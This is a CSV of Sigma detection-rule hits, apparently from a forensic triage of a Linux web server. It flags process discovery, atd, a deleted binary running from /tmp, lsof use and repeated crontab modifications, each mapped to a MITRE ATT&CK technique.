rule,severity,level,table,count,first_utc,last_utc,timestamp_utc,mitre,matched_row,description,rule_id,rule_file
Process Discovery,LOW,low,PROCESSES,1,2021-12-08 18:51:34,2021-12-08 18:51:34,2021-12-08 18:51:34,T1057,"pid=7746; user=root; start_utc=2021-12-08 18:51:34+00:00; exe=/bin/ps; exe_source=journal _EXE (same boot); args=ps -eo pid,user,lstart,args","Detects process discovery commands. Adversaries may attempt to get information about running processes on a system.
Information obtained could be used to gain an understanding of common software/applications running on systems within the network
",4e2f5868-08d4-413d-899f-dc2f1508627b,sigma-rules/rules-threat-hunting\linux\process_creation\proc_creation_lnx_susp_running_process_discovery.yml
Scheduled Task/Job At,LOW,low,PROCESSES,1,2021-10-09 15:06:25,2021-10-09 15:06:25,2021-10-09 15:06:25,T1053.002,pid=1003; ppid=1; user=daemon; owner=root; group=root; start_utc=2021-10-09 15:06:25+00:00; exe=/usr/sbin/atd; exe_source=/proc/<pid>/exe link,"Detects the use of at/atd which are utilities that are used to schedule tasks.
They are often abused by adversaries to maintain persistence or to perform task scheduling for initial or recurring execution of malicious code
",d2d642d7-b393-43fe-bae4-e81ed5915c4b,sigma-rules/rules\linux\process_creation\proc_creation_lnx_at_command.yml
Potentially Suspicious Execution From Tmp Folder,MEDIUM,medium,PROCESSES,1,2021-12-05 08:28:02,2021-12-05 08:28:02,2021-12-05 08:28:02,T1036,pid=24330; ppid=1; user=daemon; owner=daemon; group=daemon; start_utc=2021-12-05 08:28:02+00:00; exe=/tmp/agettyd (deleted); exe_source=/proc/<pid>/exe link,Detects a potentially suspicious execution of a process located in the '/tmp/' folder,312b42b1-bded-4441-8b58-163a3af58775,sigma-rules/rules\linux\process_creation\proc_creation_lnx_susp_execution_tmp_folder.yml
System Network Connections Discovery - Linux,LOW,low,PROCESSES,2,,,,T1049,pid=7978; exe=/usr/bin/lsof; exe_source=lsof txt descriptor; cwd=/root/uac; cwd_source=lsof cwd descriptor,Detects usage of system utilities to discover system network connections,4c519226-f0cd-4471-bd2f-6fbb2bb68a79,sigma-rules/rules\linux\process_creation\proc_creation_lnx_system_network_connections_discovery.yml
System Network Connections Discovery - Linux,LOW,low,PROCESSES,2,,,,T1049,pid=7984; exe=/usr/bin/lsof; exe_source=lsof txt descriptor; cwd=/root/uac; cwd_source=lsof cwd descriptor,Detects usage of system utilities to discover system network connections,4c519226-f0cd-4471-bd2f-6fbb2bb68a79,sigma-rules/rules\linux\process_creation\proc_creation_lnx_system_network_connections_discovery.yml
Process Discovery,LOW,low,PROCESS_MASTER,1,2021-12-08 18:51:34,2021-12-08 18:51:34,2021-12-08 18:51:34,T1057,"pid=7746; user=root; exe=/bin/ps; exe_source=journal _EXE (same boot); cmdline=ps -eo pid,user,lstart,args; start_utc=2021-12-08 18:51:34; sources=ps","Detects process discovery commands. Adversaries may attempt to get information about running processes on a system.
Information obtained could be used to gain an understanding of common software/applications running on systems within the network
",4e2f5868-08d4-413d-899f-dc2f1508627b,sigma-rules/rules-threat-hunting\linux\process_creation\proc_creation_lnx_susp_running_process_discovery.yml
Scheduled Task/Job At,LOW,low,PROCESS_MASTER,1,2021-10-09 15:06:25,2021-10-09 15:06:25,2021-10-09 15:06:25,T1053.002,pid=1003; ppid=1; parent=systemd; user=daemon; state=S; comm=atd; exe=/usr/sbin/atd; exe_source=/proc/<pid>/exe link,"Detects the use of at/atd which are utilities that are used to schedule tasks.
They are often abused by adversaries to maintain persistence or to perform task scheduling for initial or recurring execution of malicious code
",d2d642d7-b393-43fe-bae4-e81ed5915c4b,sigma-rules/rules\linux\process_creation\proc_creation_lnx_at_command.yml
Potentially Suspicious Execution From Tmp Folder,MEDIUM,medium,PROCESS_MASTER,1,2021-12-05 08:28:02,2021-12-05 08:28:02,2021-12-05 08:28:02,T1036,pid=24330; ppid=1; parent=systemd; user=daemon; state=S; comm=agettyd; exe=/tmp/agettyd (deleted); exe_source=/proc/<pid>/exe link,Detects a potentially suspicious execution of a process located in the '/tmp/' folder,312b42b1-bded-4441-8b58-163a3af58775,sigma-rules/rules\linux\process_creation\proc_creation_lnx_susp_execution_tmp_folder.yml
System Network Connections Discovery - Linux,LOW,low,PROCESS_MASTER,2,,,,T1049,"pid=7978; exe=/usr/bin/lsof; exe_source=lsof txt descriptor; cwd=/root/uac; open_files=16; sources=lsof, ps",Detects usage of system utilities to discover system network connections,4c519226-f0cd-4471-bd2f-6fbb2bb68a79,sigma-rules/rules\linux\process_creation\proc_creation_lnx_system_network_connections_discovery.yml
System Network Connections Discovery - Linux,LOW,low,PROCESS_MASTER,2,,,,T1049,"pid=7984; exe=/usr/bin/lsof; exe_source=lsof txt descriptor; cwd=/root/uac; open_files=11; sources=lsof, ps",Detects usage of system utilities to discover system network connections,4c519226-f0cd-4471-bd2f-6fbb2bb68a79,sigma-rules/rules\linux\process_creation\proc_creation_lnx_system_network_connections_discovery.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:05,T1053.003,timestamp_utc=2021-12-08 10:02:05; timestamp=Dec  8 10:02:05; host=ApacheWebServer; process=crontab; pid=12196; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=530,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
Modifying Crontab,MEDIUM,medium,VAR_LOG,201,2021-12-07 10:06:17,2021-12-08 15:59:14,2021-12-08 10:02:07,T1053.003,timestamp_utc=2021-12-08 10:02:07; timestamp=Dec  8 10:02:07; host=ApacheWebServer; process=crontab; pid=12203; message=(daemon) REPLACE (daemon); log=/var/log/syslog; line_no=532,Detects suspicious modification of crontab file.,af202fd3-7bff-4212-a25a-fb34606cfcbe,sigma-rules/rules\linux\builtin\cron\lnx_cron_crontab_file_modification.yml
